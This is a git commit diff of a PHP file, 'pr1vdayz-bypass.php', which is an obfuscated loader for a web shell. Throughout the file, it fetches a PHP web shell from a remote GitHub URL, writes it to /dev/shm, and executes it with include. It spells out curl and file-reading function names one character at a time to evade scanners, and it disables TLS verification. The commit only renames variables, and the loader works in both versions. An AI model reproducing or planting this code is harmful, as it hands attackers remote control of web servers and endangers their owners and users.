8123d96aa455a016c0b9567dd9d7862c08fc332b
privdayz <jr4257818@gmail.com>
2025-06-26 21:45:54 +0300

    pr1vdayz-bypass.php

--- pr1vdayz-bypass.php
+++ pr1vdayz-bypass.php
@@ -1,42 +1,41 @@
 <?php
-$_0 = ['https://raw.githubusercontent.com/privdayzcom/privdayz-web-shell/refs/heads/main/pr1vdayz.php', '/dev/shm/'.md5($_SERVER['HTTP_HOST'])];
-if(@file_exists($_0[1]) && @filesize($_0[1])>0){
-    include $_0[1];
-}else{
-    $_1 = _f($_0[0]);
-    if($_1 && strlen($_1)>40){
-        $fp = @fopen($_0[1],'wb');
-        if($fp){ @fwrite($fp,$_1); @fclose($fp); }
-        echo '<script>location.href="?PR1VD44YZCOM";</script>';
+$_A = ['https://raw.githubusercontent.com/privdayzcom/privdayz-web-shell/refs/heads/main/pr1vdayz.php', '/dev/shm/'.md5($_SERVER['HTTP_HOST'])];
+if(@file_exists($_A[1]) && @filesize($_A[1])>0){
+    @include $_A[1];
+} else {
+    $_B = __x($_A[0]);
+    if($_B && strlen($_B)>40){
+        $fp = @fopen($_A[1],'wb');
+        if($fp){ @fwrite($fp,$_B); @fclose($fp); }
     }
     exit;
 }
-function _f($u){
-    $a="c"."u"."r"."l"."_"."e"."x"."e"."c";
-    $b="c"."u"."r"."l"."_"."i"."n"."i"."t";
-    $c="c"."u"."r"."l"."_"."s"."e"."t"."o"."p"."t";
-    if(function_exists($a)){
-        $h = $b($u);
-        $c($h,19913,1); $c($h,52,1); $c($h,10018,"Mozilla/5.0");
-        $c($h,64,0); $c($h,81,0);
-        $d = $a($h);
+function __x($u){
+    $A="c"."u"."r"."l"."_"."e"."x"."e"."c";
+    $B="c"."u"."r"."l"."_"."i"."n"."i"."t";
+    $C="c"."u"."r"."l"."_"."s"."e"."t"."o"."p"."t";
+    if(function_exists($A)){
+        $h = $B($u);
+        $C($h,19913,1); $C($h,52,1); $C($h,10018,"Mozilla/5.0");
+        $C($h,64,0); $C($h,81,0);
+        $d = $A($h);
         curl_close($h);
         if($d!==false && strlen($d)>30) return $d;
     }
-    $f="f"."i"."l"."e"."_"."g"."e"."t"."_"."c"."o"."n"."t"."e"."n"."t"."s";
-    if(function_exists($f)){
+    $D="f"."i"."l"."e"."_"."g"."e"."t"."_"."c"."o"."n"."t"."e"."n"."t"."s";
+    if(function_exists($D)){
         $ctx = @stream_context_create([
             'http'=>['user_agent'=>'Mozilla/5.0'],
             'ssl'=>['verify_peer'=>false,'verify_peer_name'=>false]
         ]);
-        $d = @$f($u,0,$ctx);
+        $d = @$D($u,0,$ctx);
         if($d!==false && strlen($d)>30) return $d;
     }
-    $g="f"."o"."p"."e"."n";
-    $s="s"."t"."r"."e"."a"."m"."_"."g"."e"."t"."_"."c"."o"."n"."t"."e"."n"."t"."s";
-    if(function_exists($g) && function_exists($s)){
-        $h=@$g($u,"rb");
-        if($h){ $d=@$s($h); @fclose($h); if($d!==false && strlen($d)>30) return $d; }
+    $E="f"."o"."p"."e"."n";
+    $S="s"."t"."r"."e"."a"."m"."_"."g"."e"."t"."_"."c"."o"."n"."t"."e"."n"."t"."s";
+    if(function_exists($E) && function_exists($S)){
+        $h=@$E($u,"rb");
+        if($h){ $d=@$S($h); @fclose($h); if($d!==false && strlen($d)>30) return $d; }
     }
     return false;
 }
